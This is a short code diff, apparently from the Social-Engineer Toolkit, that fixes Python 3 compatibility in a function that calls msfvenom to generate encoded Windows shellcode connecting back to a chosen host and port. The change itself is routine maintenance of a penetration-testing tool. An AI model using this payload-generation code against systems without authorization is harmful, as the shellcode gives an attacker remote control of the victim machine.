@@ -18,6 +18,10 @@ from src.core import dictionaries
 import io
 import trace
 
+if sys.version_info >= (3, 0):
+    # python 3 removes reduce from builtin and into functools
+    from functools import *
+
 # needed for backwards compatibility of python2 vs 3 - need to convert to threading eventually
 try: import thread
 except ImportError: import _thread as thread
@@ -37,8 +41,6 @@ except ImportError:
     pass
 
 # get the main SET path
-
-
 def definepath():
     if check_os() == "posix":
         if os.path.isfile("setoolkit"):
@@ -1425,17 +1427,15 @@ def generate_shellcode(payload, ipaddr, port):
     proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" %
                             (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
+    data = str(data)
     # start to format this a bit to get it ready
-    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '',
-             'unsigned char buf=': '', 'unsignedcharbuf[]=': ''}
-    data = reduce(lambda a, kv: a.replace(*kv),
-                  iter(repls.items()), data).rstrip()
-    # return data
+    #repls = {';': '', ' ': '', '+': '', '"': '', '\n': '',
+    #         'unsigned char buf=': '', 'unsignedcharbuf[]=': ''}
+    repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=', 'unsignedcharbuf[]=']
+    for repl in repls: data = data.replace(repl, "")
     return data
 
 # this will take input for shellcode and do a replace for IP addresses
-
-
 def shellcode_replace(ipaddr, port, shellcode):
 
     # split up the ip address
